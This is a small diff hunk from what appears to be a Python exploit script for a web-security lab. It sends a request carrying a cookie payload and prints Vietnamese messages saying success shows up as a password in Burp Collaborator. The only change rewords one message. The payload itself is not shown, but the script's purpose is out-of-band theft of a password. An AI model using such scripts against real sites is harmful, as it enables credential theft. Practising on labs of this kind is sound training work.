@@ -35,6 +35,6 @@ print("[!] Gửi payload...")
 response = session.get(base_url, cookies=cookies)
 
 if response.status_code == 200:
-    print("[+] Ngon! Nếu thấy password Burp Collaborator => Ngon pro max!")
+    print("[+] Ngon! Nếu thấy password trong Burp Collaborator => Ngon pro max!")
 else:
     print("[-] Thua")
